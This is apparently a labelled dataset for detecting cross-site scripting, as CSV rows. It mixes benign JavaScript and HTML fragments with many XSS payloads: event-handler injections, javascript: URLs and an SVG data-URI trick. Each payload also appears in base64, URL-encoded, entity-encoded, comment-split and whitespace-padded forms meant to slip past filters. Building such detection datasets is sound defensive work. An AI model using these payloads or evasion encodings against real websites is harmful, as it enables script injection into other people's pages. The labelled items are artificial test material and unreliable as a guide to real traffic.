sample_id,variant_id,technique,payload_original,payload_obfuscated,label
1899,0,none,"<li><a href=""/wiki/catastrophe_theory"" title=""catastrophe theory"">catastrophe theory </a> </li>","<li><a href=""/wiki/catastrophe_theory"" title=""catastrophe theory"">catastrophe theory </a> </li>",0
1900,0,none,"import config from './config.js' import { execute, executeaftertransition, getelement, reflow","import config from './config.js' import { execute, executeaftertransition, getelement, reflow",0
1901,0,none,"if ($(e.target).is(input_selector)) { $(e.target) .siblings('label, .prefix')","if ($(e.target).is(input_selector)) { $(e.target) .siblings('label, .prefix')",0
1902,0,none,"var ishours = view === 'hours', nextview = ishours ? this.hoursview : this.minutesview, hideview = ishours ? this.minutesview : this.hoursview;","var ishours = view === 'hours', nextview = ishours ? this.hoursview : this.minutesview, hideview = ishours ? this.minutesview : this.hoursview;",0
1903,0,none,"this.el.addeventlistener('mouseenter', this._handlemouseenterbound); this.el.addeventlistener('mouseleave', this._handlemouseleavebound); this.el.addeventlistener('focus', this._handlefocusbound, true);","this.el.addeventlistener('mouseenter', this._handlemouseenterbound); this.el.addeventlistener('mouseleave', this._handlemouseleavebound); this.el.addeventlistener('focus', this._handlefocusbound, true);",0
1904,0,none,".find('input[type=""checkbox""]')",".find('input[type=""checkbox""]')",0
1905,0,none,"<p>artificial intelligence (ai) is becoming a mainstay component of law-related professions. in some circumstances, this analytics-crunching technology is using algorithms and machine learning to do work that was previously done by entry-level lawyers.<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (december 2019)"">citation needed","<p>artificial intelligence (ai) is becoming a mainstay component of law-related professions. in some circumstances, this analytics-crunching technology is using algorithms and machine learning to do work that was previously done by entry-level lawyers.<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (december 2019)"">citation needed",0
1906,1,comment_marker,"<style>:target {transform: rotate(180deg);}</style><noscript id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noscript>","<style>:targe/*OBF*/t {transform: rotate(180deg);}</style><noscript id=x style=""trans/*OBF*/ition:transform 2s"" ontransitionrun=alert(1)></no/*OBF*/script>",1
1906,2,base64,"<style>:target {transform: rotate(180deg);}</style><noscript id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noscript>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PG5vc2NyaXB0IGlkPXggc3R5bGU9InRyYW5zaXRpb246dHJhbnNmb3JtIDJzIiBvbnRyYW5zaXRpb25ydW49YWxlcnQoMSk+PC9ub3NjcmlwdD4=,1
1906,3,urlencode,"<style>:target {transform: rotate(180deg);}</style><noscript id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noscript>",%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cnoscript%20id%3Dx%20style%3D%22transition%3Atransform%202s%22%20ontransitionrun%3Dalert%281%29%3E%3C%2Fnoscript%3E,1
1907,0,none,var _this52 = this; var windowwidth = window.innerwidth; var windowheight = window.innerheight;,var _this52 = this; var windowwidth = window.innerwidth; var windowheight = window.innerheight;,0
1908,1,html_then_urlencode,"<em onclick=""alert(1)"">test</em>",%26lt%3Bem%20onclick%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fem%26gt%3B,1
1908,2,whitespace_noise,"<em onclick=""alert(1)"">test</em>","<em onclick="" alert(1)"">test</em>",1
1908,3,double_urlencode,"<em onclick=""alert(1)"">test</em>",%253Cem%2520onclick%253D%2522alert%25281%2529%2522%253Etest%253C%252Fem%253E,1
1909,0,none,selected = this._toggleentryfromarray(key),selected = this._toggleentryfromarray(key),0
1910,0,none,yyyy: () => { return this.date.getfullyear(); },yyyy: () => { return this.date.getfullyear(); },0
1911,0,none,} } _handlewindowescape(e) {,} } _handlewindowescape(e) {,0
1912,1,whitespace_noise,<svg><figcaption onload=alert(1)></figcaption>,<svg><figcaption onload=alert(1)>  </figcaption>,1
1912,2,comment_marker,<svg><figcaption onload=alert(1)></figcaption>,<svg><figcaption onlo/*OBF*/ad=alert(1)></figc/*OBF*/aption>,1
1912,3,double_urlencode,<svg><figcaption onload=alert(1)></figcaption>,%253Csvg%253E%253Cfigcaption%2520onload%253Dalert%25281%2529%253E%253C%252Ffigcaption%253E,1
1913,0,none,return; } index = this._wrap(index);,return; } index = this._wrap(index);,0
1914,1,comment_marker,<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,<rp onfocusout=alert(1) tabindex=1 id=x></rp><input auto/*OBF*/focus>,1
1914,2,urlencode,<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,%3Crp%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Frp%3E%3Cinput%20autofocus%3E,1
1914,3,base64,<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,PHJwIG9uZm9jdXNvdXQ9YWxlcnQoMSkgdGFiaW5kZXg9MSBpZD14PjwvcnA+PGlucHV0IGF1dG9mb2N1cz4=,1
1915,0,none,if ( options.ort === 0 ) {,if ( options.ort === 0 ) {,0
1916,1,urlencode,"c=""javascript:""",c%3D%22javascript%3A%22,1
1916,2,comment_marker,"c=""javascript:""","c=""j/*OBF*/avascript:""",1
1916,3,html_then_urlencode,"c=""javascript:""",c%3D%26quot%3Bjavascript%3A%26quot%3B,1
1917,0,none,"<div id=""philosophers_of_science_by_era"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/list_of_philosophers_of_science"" title=""list of philosophers of science"">philosophers of science </a> by era </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">","<div id=""philosophers_of_science_by_era"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/list_of_philosophers_of_science"" title=""list of philosophers of science"">philosophers of science </a> by era </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0
1918,1,urlencode,<menu id=x tabindex=1 onactivate=alert(1)></menu>,%3Cmenu%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C%2Fmenu%3E,1
1918,2,html_entities,<menu id=x tabindex=1 onactivate=alert(1)></menu>,&lt;menu id=x tabindex=1 onactivate=alert(1)&gt;&lt;/menu&gt;,1
1918,3,html_then_urlencode,<menu id=x tabindex=1 onactivate=alert(1)></menu>,%26lt%3Bmenu%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%26gt%3B%26lt%3B%2Fmenu%26gt%3B,1
1919,0,none,var pos = offset(el); var relativey = (e.pagey - pos.top); var relativex = (e.pagex - pos.left);,var pos = offset(el); var relativey = (e.pagey - pos.top); var relativex = (e.pagex - pos.left);,0
1920,1,urlencode,"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cbdi%20ondrop%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fbdi%3E,1
1920,2,comment_marker,"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>","<d/*OBF*/iv draggable=""true"" contenteditable>drag me</div><bdi o/*OBF*/ndrop=alert(1) contenteditable>drop here</bdi>",1
1920,3,whitespace_noise,"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>","<div draggable=""true""  contenteditable>drag me</div><bdi ondrop=alert(1)   contenteditable>drop here</bdi>",1
1921,1,html_entities,"<nav draggable=""true"" ondragenter=""alert(1)"">test</nav>",&lt;nav draggable=&quot;true&quot; ondragenter=&quot;alert(1)&quot;&gt;test&lt;/nav&gt;,1
1921,2,comment_marker,"<nav draggable=""true"" ondragenter=""alert(1)"">test</nav>","<nav draggable/*OBF*/=""true/*OBF*/"" ondragenter=""alert(1)"">test</nav>",1
1921,3,base64,"<nav draggable=""true"" ondragenter=""alert(1)"">test</nav>",PG5hdiBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ2VudGVyPSJhbGVydCgxKSI+dGVzdDwvbmF2Pg==,1
1922,1,comment_marker,"<details draggable=""true"" ondragstart=""alert(1)"">test</details>","<details draggable=""true"" ondragstart=""a/*OBF*/lert(1)"">test</deta/*OBF*/ils>",1
1922,2,html_entities,"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",&lt;details draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/details&gt;,1
1922,3,base64,"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",PGRldGFpbHMgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdzdGFydD0iYWxlcnQoMSkiPnRlc3Q8L2RldGFpbHM+,1
1923,0,none,"key: ""_xpos"", value: function _xpos(e) { if (e.targettouches && e.targettouches.length >= 1) {","key: ""_xpos"", value: function _xpos(e) { if (e.targettouches && e.targettouches.length >= 1) {",0
1924,1,urlencode,<style id=x tabindex=1 onfocusin=alert(1)></style>,%3Cstyle%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fstyle%3E,1
1924,2,comment_marker,<style id=x tabindex=1 onfocusin=alert(1)></style>,<style id=x tabindex=1 onfocusin=alert(1)></style>,1
1924,3,base64,<style id=x tabindex=1 onfocusin=alert(1)></style>,PHN0eWxlIGlkPXggdGFiaW5kZXg9MSBvbmZvY3VzaW49YWxlcnQoMSk+PC9zdHlsZT4=,1
1925,1,urlencode,"<tfoot onmouseout=""alert(1)"">test</tfoot>",%3Ctfoot%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Ftfoot%3E,1
1925,2,double_urlencode,"<tfoot onmouseout=""alert(1)"">test</tfoot>",%253Ctfoot%2520onmouseout%253D%2522alert%25281%2529%2522%253Etest%253C%252Ftfoot%253E,1
1925,3,html_then_urlencode,"<tfoot onmouseout=""alert(1)"">test</tfoot>",%26lt%3Btfoot%20onmouseout%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Ftfoot%26gt%3B,1
1926,1,html_entities,"<figure onpaste=""alert(1)"" contenteditable>test</figure>",&lt;figure onpaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/figure&gt;,1
1926,2,whitespace_noise,"<figure onpaste=""alert(1)"" contenteditable>test</figure>","<figure onpaste=""alert(1)""   contenteditable>test</figure> ",1
1926,3,comment_marker,"<figure onpaste=""alert(1)"" contenteditable>test</figure>","<figure onpaste=""alert(1)"" contenteditable>test</figure>",1
1927,0,none,start = this.percentopen,start = this.percentopen,0
1928,0,none,if (i >= opts.minyear) {,if (i >= opts.minyear) {,0
1929,0,none,this._renderdatedisplay(); return this.draw(); },this._renderdatedisplay(); return this.draw(); },0
1930,0,none,"var origin = addnodeto(base, options.cssclasses.origin)","var origin = addnodeto(base, options.cssclasses.origin)",0
1931,1,urlencode,"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",%3Cbase%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fbase%3E,1
1931,2,whitespace_noise,"<base draggable=""true"" ondragenter=""alert(1)"">test</base>","<base draggable=""true""   ondragenter=""  alert(1)"">test</  base>",1
1931,3,base64,"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",PGJhc2UgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdlbnRlcj0iYWxlcnQoMSkiPnRlc3Q8L2Jhc2U+,1
1932,1,whitespace_noise,"<acronym onmouseleave=""alert(1)"">test</acronym>","<acronym onmouseleave=""alert(1)"" >test</acronym>",1
1932,2,html_then_urlencode,"<acronym onmouseleave=""alert(1)"">test</acronym>",%26lt%3Bacronym%20onmouseleave%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Facronym%26gt%3B,1
1932,3,base64,"<acronym onmouseleave=""alert(1)"">test</acronym>",PGFjcm9ueW0gb25tb3VzZWxlYXZlPSJhbGVydCgxKSI+dGVzdDwvYWNyb255bT4=,1
1933,1,html_then_urlencode,"<svg><animate xlink:href=""#x"" attributename=""href"" values=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" /><use id=x />",%26lt%3Bsvg%26gt%3B%26lt%3Banimate%20xlink%3Ahref%3D%26quot%3B%23x%26quot%3B%20attributename%3D%26quot%3Bhref%26quot%3B%20values%3D%26quot%3Bdata%3Aimage%2Fsvg%2Bxml%2C%26amp%3Blt%3Bsvg%20id%3D%26%23x27%3Bx%26%23x27%3B%20xmlns%3D%26%23x27%3Bhttp%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%26%23x27%3B%26amp%3Bgt%3B%26amp%3Blt%3Bimage%20href%3D%26%23x27%3B1%26%23x27%3B%20onerror%3D%26%23x27%3Balert%281%29%26%23x27%3B%20%2F%26amp%3Bgt%3B%26amp%3Blt%3B%2Fsvg%26amp%3Bgt%3B%23x%26quot%3B%20%2F%26gt%3B%26lt%3Buse%20id%3Dx%20%2F%26gt%3B,1
1933,2,double_urlencode,"<svg><animate xlink:href=""#x"" attributename=""href"" values=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" /><use id=x />",%253Csvg%253E%253Canimate%2520xlink%253Ahref%253D%2522%2523x%2522%2520attributename%253D%2522href%2522%2520values%253D%2522data%253Aimage%252Fsvg%252Bxml%252C%2526lt%253Bsvg%2520id%253D%2527x%2527%2520xmlns%253D%2527http%253A%252F%252Fwww.w3.org%252F2000%252Fsvg%2527%2526gt%253B%2526lt%253Bimage%2520href%253D%25271%2527%2520onerror%253D%2527alert%25281%2529%2527%2520%252F%2526gt%253B%2526lt%253B%252Fsvg%2526gt%253B%2523x%2522%2520%252F%253E%253Cuse%2520id%253Dx%2520%252F%253E,1
1933,3,base64,"<svg><animate xlink:href=""#x"" attributename=""href"" values=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" /><use id=x />",PHN2Zz48YW5pbWF0ZSB4bGluazpocmVmPSIjeCIgYXR0cmlidXRlbmFtZT0iaHJlZiIgdmFsdWVzPSJkYXRhOmltYWdlL3N2Zyt4bWwsJmx0O3N2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyZndDsmbHQ7aW1hZ2UgaHJlZj0nMScgb25lcnJvcj0nYWxlcnQoMSknIC8mZ3Q7Jmx0Oy9zdmcmZ3Q7I3giIC8+PHVzZSBpZD14IC8+,1
1934,0,none,"this.prop(key, name[key]); } return this;","this.prop(key, name[key]); } return this;",0
1935,0,none,"</span> <span class=""reference-text""><cite class=""citation book"">mead, carver a.; ismail, mohammed (8 may 1989). <a rel=""nofollow"" class=""external text"" href=""http://fennetic.net/irc/christopher%20r.%20carroll%20carver%20mead%20mohammed%20ismail%20analog%20vlsi%20implementation%20of%20neural%20systems.pdf""><i>analog vlsi implementation of neural systems </i> </a> <span class=""cs1-format"">(pdf)","</span> <span class=""reference-text""><cite class=""citation book"">mead, carver a.; ismail, mohammed (8 may 1989). <a rel=""nofollow"" class=""external text"" href=""http://fennetic.net/irc/christopher%20r.%20carroll%20carver%20mead%20mohammed%20ismail%20analog%20vlsi%20implementation%20of%20neural%20systems.pdf""><i>analog vlsi implementation of neural systems </i> </a> <span class=""cs1-format"">(pdf)",0
1936,0,none,"function insertcontent(parent, child, prepend) {","function insertcontent(parent, child, prepend) {",0
1937,0,none,"this._updateitemstyle(el, tweenedopacity, -i, transformstring); } if (this.options.fullwidth) {","this._updateitemstyle(el, tweenedopacity, -i, transformstring); } if (this.options.fullwidth) {",0
1938,1,whitespace_noise,<video><source onerror=alert(1) src=1></video>,<video> <source onerror=alert(1)   src=1></  video>,1
1938,2,base64,<video><source onerror=alert(1) src=1></video>,PHZpZGVvPjxzb3VyY2Ugb25lcnJvcj1hbGVydCgxKSBzcmM9MT48L3ZpZGVvPg==,1
1938,3,double_urlencode,<video><source onerror=alert(1) src=1></video>,%253Cvideo%253E%253Csource%2520onerror%253Dalert%25281%2529%2520src%253D1%253E%253C%252Fvideo%253E,1
1939,1,base64,"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",PHEgb25iZWZvcmVwYXN0ZT0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9xPg==,1
1939,2,whitespace_noise,"<q onbeforepaste=""alert(1)"" contenteditable>test</q>","<q onbeforepaste=""alert(1)"" contenteditable>test</q>",1
1939,3,double_urlencode,"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",%253Cq%2520onbeforepaste%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fq%253E,1
1940,0,none,"const tab_nav_backward = 'backward'; const default$7 = { autofocus: true,","const tab_nav_backward = 'backward'; const default$7 = { autofocus: true,",0
1941,0,none,"static jqueryinterface(config) { return this.each(function () { const data = dropdown.getorcreateinstance(this, config)","static jqueryinterface(config) { return this.each(function () { const data = dropdown.getorcreateinstance(this, config)",0
1942,1,urlencode,<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,%3Cbdo%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C%2Fbdo%3E,1
1942,2,whitespace_noise,<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,<bdo id=x tabindex=1 onbeforeactivate= alert(1)>  </bdo>,1
1942,3,html_then_urlencode,<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,%26lt%3Bbdo%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%26gt%3B%26lt%3B%2Fbdo%26gt%3B,1
1943,0,none,$(this).toggleclass('container'),$(this).toggleclass('container'),0
1944,0,none,promise.resolve().then(function () {,promise.resolve().then(function () {,0
1945,1,urlencode,"<u onkeydown=""alert(1)"" contenteditable>test</u>",%3Cu%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fu%3E,1
1945,2,base64,"<u onkeydown=""alert(1)"" contenteditable>test</u>",PHUgb25rZXlkb3duPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L3U+,1
1945,3,double_urlencode,"<u onkeydown=""alert(1)"" contenteditable>test</u>",%253Cu%2520onkeydown%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fu%253E,1
1946,0,none,toggle(relatedtarget) {,toggle(relatedtarget) {,0
1947,1,base64,<small id=x tabindex=1 onfocusin=alert(1)></small>,PHNtYWxsIGlkPXggdGFiaW5kZXg9MSBvbmZvY3VzaW49YWxlcnQoMSk+PC9zbWFsbD4=,1
1947,2,html_entities,<small id=x tabindex=1 onfocusin=alert(1)></small>,&lt;small id=x tabindex=1 onfocusin=alert(1)&gt;&lt;/small&gt;,1
1947,3,whitespace_noise,<small id=x tabindex=1 onfocusin=alert(1)></small>,< small id=  x tabindex=1 onfocusin=alert(1)>  </small>  ,1
1948,1,html_then_urlencode,<menu onpointerdown=alert(1)>xss</menu>,%26lt%3Bmenu%20onpointerdown%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fmenu%26gt%3B,1
1948,2,html_entities,<menu onpointerdown=alert(1)>xss</menu>,&lt;menu onpointerdown=alert(1)&gt;xss&lt;/menu&gt;,1
1948,3,double_urlencode,<menu onpointerdown=alert(1)>xss</menu>,%253Cmenu%2520onpointerdown%253Dalert%25281%2529%253Exss%253C%252Fmenu%253E,1
1949,0,none,return this[0] ? this[0].getattribute ? this[0].getattribute(name) : this[0][name] : undefined,return this[0] ? this[0].getattribute ? this[0].getattribute(name) : this[0][name] : undefined,0
1950,1,whitespace_noise,url(javascript:alert('')),url(javascript:alert('')) ,1
1950,2,base64,url(javascript:alert('')),dXJsKGphdmFzY3JpcHQ6YWxlcnQoJycpKQ==,1
1950,3,comment_marker,url(javascript:alert('')),url(javascript:alert('')),1
1951,0,none,}]; } this.adjustcalendars();,}]; } this.adjustcalendars();,0
1952,1,html_entities,"<dir oncontextmenu=""alert(1)"">test</dir>",&lt;dir oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/dir&gt;,1
1952,2,urlencode,"<dir oncontextmenu=""alert(1)"">test</dir>",%3Cdir%20oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,1
1952,3,whitespace_noise,"<dir oncontextmenu=""alert(1)"">test</dir>","<dir oncontextmenu= ""alert(1)"">test<  /dir>",1
1953,0,none,}); }function d(a) { return g.reversed ? g.duration - a : a;,}); }function d(a) { return g.reversed ? g.duration - a : a;,0
1954,0,none,</h3>,</h3>,0
1955,1,base64,"<meta onmouseout=""alert(1)"">test</meta>",PG1ldGEgb25tb3VzZW91dD0iYWxlcnQoMSkiPnRlc3Q8L21ldGE+,1
1955,2,html_then_urlencode,"<meta onmouseout=""alert(1)"">test</meta>",%26lt%3Bmeta%20onmouseout%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fmeta%26gt%3B,1
1955,3,urlencode,"<meta onmouseout=""alert(1)"">test</meta>",%3Cmeta%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fmeta%3E,1
1956,1,urlencode,"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",%3Cabbr%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fabbr%3E,1
1956,2,whitespace_noise,"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>","<abbr oncopy=""alert(1)""  contenteditable>test</abbr>",1
1956,3,base64,"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",PGFiYnIgb25jb3B5PSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2FiYnI+,1
1957,0,none,const event_activate = `activate${event_key}`; const event_click = `click${event_key}`; const event_load_data_api = `load${event_key}${data_api_key}`;,const event_activate = `activate${event_key}`; const event_click = `click${event_key}`; const event_load_data_api = `load${event_key}${data_api_key}`;,0
1958,1,whitespace_noise,"<code onkeydown=""alert(1)"" contenteditable>test</code>","<code onkeydown=""alert(1)"" contenteditable>test<  /code>",1
1958,2,double_urlencode,"<code onkeydown=""alert(1)"" contenteditable>test</code>",%253Ccode%2520onkeydown%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fcode%253E,1
1958,3,html_entities,"<code onkeydown=""alert(1)"" contenteditable>test</code>",&lt;code onkeydown=&quot;alert(1)&quot; contenteditable&gt;test&lt;/code&gt;,1
1959,0,none,let $closetrigger = $(e.target).closest('.modal-close'); if ($closetrigger.length) { this.close();,let $closetrigger = $(e.target).closest('.modal-close'); if ($closetrigger.length) { this.close();,0
1960,1,html_then_urlencode,<textarea autofocus onfocus=alert(1)>test</textarea>,%26lt%3Btextarea%20autofocus%20onfocus%3Dalert%281%29%26gt%3Btest%26lt%3B%2Ftextarea%26gt%3B,1
1960,2,base64,<textarea autofocus onfocus=alert(1)>test</textarea>,PHRleHRhcmVhIGF1dG9mb2N1cyBvbmZvY3VzPWFsZXJ0KDEpPnRlc3Q8L3RleHRhcmVhPg==,1
1960,3,double_urlencode,<textarea autofocus onfocus=alert(1)>test</textarea>,%253Ctextarea%2520autofocus%2520onfocus%253Dalert%25281%2529%253Etest%253C%252Ftextarea%253E,1
1961,0,none,class range extends component {,class range extends component {,0
1962,1,double_urlencode,<title onpointerover=alert(1)>xss</title>,%253Ctitle%2520onpointerover%253Dalert%25281%2529%253Exss%253C%252Ftitle%253E,1
1962,2,urlencode,<title onpointerover=alert(1)>xss</title>,%3Ctitle%20onpointerover%3Dalert%281%29%3Exss%3C%2Ftitle%3E,1
1962,3,html_entities,<title onpointerover=alert(1)>xss</title>,&lt;title onpointerover=alert(1)&gt;xss&lt;/title&gt;,1
1963,0,none,"<li><a href=""/wiki/hardware_acceleration"" title=""hardware acceleration"">hardware acceleration </a> </li> </ul>","<li><a href=""/wiki/hardware_acceleration"" title=""hardware acceleration"">hardware acceleration </a> </li> </ul>",0
1964,0,none,if (context._menu.contains(event.target) && (event.type === 'keyup' && event.key === tab_key || /input|select|option|textarea|form/i.test(event.target.tagname))) {,if (context._menu.contains(event.target) && (event.type === 'keyup' && event.key === tab_key || /input|select|option|textarea|form/i.test(event.target.tagname))) {,0
1965,1,html_then_urlencode,<summary onpointerenter=alert(1)>xss</summary>,%26lt%3Bsummary%20onpointerenter%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fsummary%26gt%3B,1
1965,2,comment_marker,<summary onpointerenter=alert(1)>xss</summary>,<summary onpoint/*OBF*/erenter=alert(1)>xss</summary>,1
1965,3,whitespace_noise,<summary onpointerenter=alert(1)>xss</summary>,<summary onpointerenter=alert( 1)>xss</summary>,1
1966,0,none,hide: function(e) { touchhandler.touchup(e); var el = this;,hide: function(e) { touchhandler.touchup(e); var el = this;,0
1967,1,whitespace_noise,"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>","<tt draggable=""true"" ondragstart=""alert(1)"">test</tt> ",1
1967,2,html_then_urlencode,"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",%26lt%3Btt%20draggable%3D%26quot%3Btrue%26quot%3B%20ondragstart%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Ftt%26gt%3B,1
1967,3,base64,"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",PHR0IGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnc3RhcnQ9ImFsZXJ0KDEpIj50ZXN0PC90dD4=,1
1968,0,none,"var classes = getclasses(c); return (classes ? this.each(function (v) { var spacedname = "" "" + v.classname + "" "";","var classes = getclasses(c); return (classes ? this.each(function (v) { var spacedname = "" "" + v.classname + "" "";",0
1969,0,none,"this._element.setattribute('aria-pressed', this._element.classlist.toggle(class_name_active$3))","this._element.setattribute('aria-pressed', this._element.classlist.toggle(class_name_active$3))",0
1970,0,none,}; const slideevent = triggerevent(event_slide); if (slideevent.defaultprevented) {,}; const slideevent = triggerevent(event_slide); if (slideevent.defaultprevented) {,0
1971,1,double_urlencode,<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,%253Cnoscript%2520id%253Dx%2520tabindex%253D1%2520onfocusin%253Dalert%25281%2529%253E%253C%252Fnoscript%253E,1
1971,2,comment_marker,<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,1
1971,3,html_entities,<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,&lt;noscript id=x tabindex=1 onfocusin=alert(1)&gt;&lt;/noscript&gt;,1
1972,1,html_entities,"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;summary ondragover=alert(1) contenteditable&gt;drop here&lt;/summary&gt;,1
1972,2,urlencode,"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Csummary%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fsummary%3E,1
